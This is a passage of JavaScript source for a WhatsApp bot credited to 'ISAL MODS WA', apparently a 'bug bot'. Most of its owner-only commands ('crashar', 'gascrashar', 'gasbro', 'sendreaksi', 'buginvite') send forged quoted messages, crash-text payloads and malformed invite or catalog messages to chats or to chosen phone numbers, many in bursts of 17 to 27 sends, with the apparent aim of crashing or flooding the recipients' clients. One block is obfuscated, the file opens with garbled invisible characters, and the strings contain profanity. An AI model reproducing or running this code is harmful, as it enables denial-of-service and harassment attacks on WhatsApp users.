󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓??󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧?',
ranz.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${bugweb}`,body: 'ISAL MODS WA 🔥',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://youtube.com/channel/UC7CtK1YjIz4jg_A7zIzSxzg`}}})
break
//=================================================//
case 'bugsex': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© ISAL MODS WA`,
"matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
"description": "Undangan Grup WhatsApp",
"title": `© ISAL MODS WA${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case 'bugepep': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© ISAL MODS WA`,
"matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
"description": "BOCIL EPEP SALAM BOOYAH",
"title": `© ISAL MODS WA${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
case 'dok':
if (!isCreator) throw mess.owner
y1 = fs.readFileSync('./pirtex/iphone.mp3')
ranz.sendMessage(m.chat, {document: y1, fileName: `BOT ISAL MODS .${buttonvirus}.mp3`, quoted: m})
break
//=================================================//
case 'virdokcrash':
if (!isCreator) throw mess.owner
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
y1 = fs.readFileSync('./pirtex/iphone.mp3')
ranz.sendMessage(m.chat, {document: y1, fileName: `© ISAL MODS WA${buttonkal}.mp3`, quoted: adehvn})
break
//=================================================//
case 'bugpdf':
if (!isCreator) throw mess.owner
y1 = fs.readFileSync('./pirtex/iphone.mp3')
ranz.sendMessage(m.chat, {document: y1, fileName: `© ISAL MODS WA${virtexcrash}.mp3`, quoted: m })
break
//=================================================//
case 'ranzaja' : {
if (!isCreator) throw mess.owner
connecting = ranz
function _0x1a02(){var _0x9511fa=['sendMessage','quoted','1246790oINqcJ','2yEapSB','awowkwkwk','2382268ivygFy','key','replace','chat','27oEkRwD','2199110ufwRsE','@s.whatsapp.net','6rIhLFT','mentionedJid','154832trKriz','1312287KZVhaq','100117IRrQXd','3554016vHMCCV'];_0x1a02=function(){return _0x9511fa;};return _0x1a02();}var _0x513741=_0x2c43;function _0x2c43(_0x50ccd7,_0x5a8a17){var _0x1a0292=_0x1a02();return _0x2c43=function(_0x2c43dc,_0x4ba15e){_0x2c43dc=_0x2c43dc-0x1a9;var _0x3d4510=_0x1a0292[_0x2c43dc];return _0x3d4510;},_0x2c43(_0x50ccd7,_0x5a8a17);}(function(_0x3c1583,_0x4a5a47){var _0x5568b0=_0x2c43,_0x59e990=_0x3c1583();while(!![]){try{var _0x1d994b=parseInt(_0x5568b0(0x1ac))/0x1*(-parseInt(_0x5568b0(0x1b1))/0x2)+-parseInt(_0x5568b0(0x1ab))/0x3+-parseInt(_0x5568b0(0x1aa))/0x4+-parseInt(_0x5568b0(0x1b0))/0x5*(-parseInt(_0x5568b0(0x1ba))/0x6)+parseInt(_0x5568b0(0x1b3))/0x7+-parseInt(_0x5568b0(0x1ad))/0x8+-parseInt(_0x5568b0(0x1b7))/0x9*(-parseInt(_0x5568b0(0x1b8))/0xa);if(_0x1d994b===_0x4a5a47)break;else _0x59e990['push'](_0x59e990['shift']());}catch(_0x52a42e){_0x59e990['push'](_0x59e990['shift']());}}}(_0x1a02,0x37e2d),Pe=m['mentionedJid'][0x0]?m[_0x513741(0x1a9)][0x0]:m[_0x513741(0x1af)]?m[_0x513741(0x1af)]['sender']:text[_0x513741(0x1b5)](/[^0-9]/g,'')+_0x513741(0x1b9),a=await connecting['sendMessage'](m[_0x513741(0x1b6)],{'react':{'text':'\x20️','key':{'remoteJid':m[_0x513741(0x1b6)],'fromMe':!![],'id':m[_0x513741(0x1b4)]['id']}}}),connecting[_0x513741(0x1ae)](Pe,{'text':_0x513741(0x1b2)},{'quoted':a}));
}
break
//=================================================//
case 'bukadong':
if (!isCreator) throw mess.owner
ranzlistmessagebug = [
                {
                title: `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥 ${ranzmods} ${buttonvirus}`,
                rows: [
                {title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
                {title: ranzmods, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
                ]
                }
                ]
                ranz.sendListMsg(m.chat, `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥`, ranz.user.name, `Hay Ngentod`, `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥`, ranzlistmessagebug, m)
break
case 'isaltag': {
                if (!isCreator) throw mess.owner
                if (!m.isGroup) throw mess.group                
                let teks = philips
                for (let mem of participants) {
                teks += `⭔ @${mem.id.split('@')[0]}\n`
                }
                ranz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
//=================================================//
         case 'sayangcrash':               
          if (!isCreator) throw mess.owner
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `© ISAL MODS WA`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            break
//=================================================//
            case 'gasbro':
                if (!isCreator) throw mess.owner
                if (!text) throw `MANA NOMERNYA KONTOL`
                gasbugpc = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `© ISAL MODS WA`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
                ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:gasbugpc})
                ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:gasbugpc})
                ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:gasbugpc})
                ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:gasbugpc})
                ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:gasbugpc})
                m.reply(`succes`)

                break
//=================================================//
                case 'gasbtt':
                    if (!isCreator) throw mess.owner
                    if (!text) throw `MANA NOMERNYA KONTOL`
                 buttonspc = [
                        {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
                        {buttonId: 'babaabbabababa', buttonText: {displayText: ranzmods}, type: 1},
                        {buttonId: 'babababbababa', buttonText: {displayText: ngazap}, type: 1}
                      ]
                      
                    buttonMessagepc = {
                          text: "© ISAL MODS WA",
                          footerText: 'Pe',
                          buttons: buttonspc,
                          headerType: 1
                      }
                      ranz.sendMessage(`${text}@s.whatsapp.net`, buttonMessagepc)
                      m.reply(`succes`)
                    break
//=================================================//
                    case 'crashar':               
          if (!isCreator) throw mess.owner
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `© ISAL MODS WA`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            break
//=================================================//
            case 'gascrashar':               
          if (!isCreator) throw mess.owner
          if (!text) throw `MANA NOMERNYA KONTOL`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `© ISAL MODS WA`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            await ranz.sendMessage(`${text}@s.whatsapp.net`, {text:"© ISAL MODS WA"},{quoted:asukonyol11})
            m.reply(`SUCCES`)
            break
//=================================================//
            case 'sendreaksi' : {
                if (!isCreator) throw mess.owner
                Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
                a = await ranz.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
                await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
                await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
                await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
                await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
                await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
                await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
                await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
await ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: a})
m.reply(`SUCCES`)
                await sleep(20)
            }
                break
//=================================================//
                case 'colidek' : {
                    if (!isCreator) throw mess.owner
                    a = await ranz.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    await ranz.sendMessage(m.chat, {text:"© ISAL MODS WA"}, {quoted: a})
                    m.reply(`BUG COLI DEK`)
                     }
                break
//=================================================//
case 'catalog': {

if (!isCreator) throw mess.owner

adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }

var messa = await prepareWAMessageMedia({ image: thumb }, { upload: ranz.waUploadToServer })

var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({

"productMessage": {

"product": {

"productImage": messa.imageMessage,

"productId": "99999999999999",

"title": `© ISAL MODS WA ${buttonvirus}`,

"description": `© ISAL MODS WA ${buttonvirus}`,

"currencyCode": "IDR",

"footerText": `🔥🔥🔥🔥🔥`,

"priceAmount1000": "10000000",

"productImageCount": 1,

"firstImageId": 1,

"salePriceAmount1000": "10000000",

"retailerId": `ISAL`,

"url": "https://youtube.com/channel/UC7CtK1YjIz4jg_A7zIzSxzg"

},

"businessOwnerJid": "6285724506534@s.whatsapp.net",

}

}), { userJid: m.chat, quoted: adehvn })

ranz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })

}

break
//=================================================//
case 'buginvite': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `© ISAL MODS WA${ngazap(prefix)}`,
"groupName": `© ISAL MODS WA${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
break
//=================================================//
case 'buggc': {
if (!isCreator) return
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (welcm) return anjay('Sudah Aktif')
wlcm.push(from)
anjay('Sukses Telah mengaktifkan Bug Gc Di group Ini')
var groupe = await ranz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
